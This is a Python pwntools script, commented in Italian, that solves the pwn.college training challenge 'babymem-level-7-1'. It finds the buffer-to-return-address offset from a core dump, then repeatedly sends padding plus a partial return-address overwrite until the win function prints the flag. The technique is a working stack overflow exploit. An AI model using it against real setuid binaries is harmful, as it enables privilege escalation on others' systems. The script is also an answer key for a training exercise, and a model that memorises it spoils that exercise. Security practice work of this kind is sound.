#!/usr/bin/python3
from pwn import *

'''
-- OBIETTIVO DEL PROGRAMMA --


-----------------------------
'''

# Impostazione dell'architettura di riferimento e del livello di log
context.log_level = 'CRITICAL'

# File binario da eseguire
elf = ELF('/challenge/babymem-level-7-1')

# =========================================================== #
# =========================================================== #
# =========================================================== #

# Avvio del processo con 'setuid = false' per generare il memory core dump 
p_dump = elf.process(setuid=False)

# Invio di una cyclic string per far crashare il processo e ottenere il memory core dump 
p_dump.sendline(b'512')
p_dump.sendline(cyclic(512, n=8)) # n = 8 (byte) per la dimensione degli indirizzi
p_dump.wait()

# Uso del memory core dump generato per calcolare la dimensione del buffer
core_dump = p_dump.corefile.fault_addr
delta_len = cyclic_find(core_dump, n=8)
print(f'\nDistanza tra buffer e return address: {delta_len}\n')

# =========================================================== #
# =========================================================== #
# =========================================================== #

# Preparazione del bytestream
win_addr =  p16(0x1666)
padding = b'A' * delta_len
bytestream = padding + win_addr

# Esecuzione continua dell'exploit fino a quando non si indovina il byte corretto
while True:

  # Avvio del processo con 'setuid = true'
  p = elf.process()

  # Interazione con il processo e invio del bytestream
  p.sendline(f'{len(bytestream)}'.encode())
  p.sendline(bytestream)
  output = p.recvall().decode()

  if 'pwn.college' in output:
    print(output)
    break
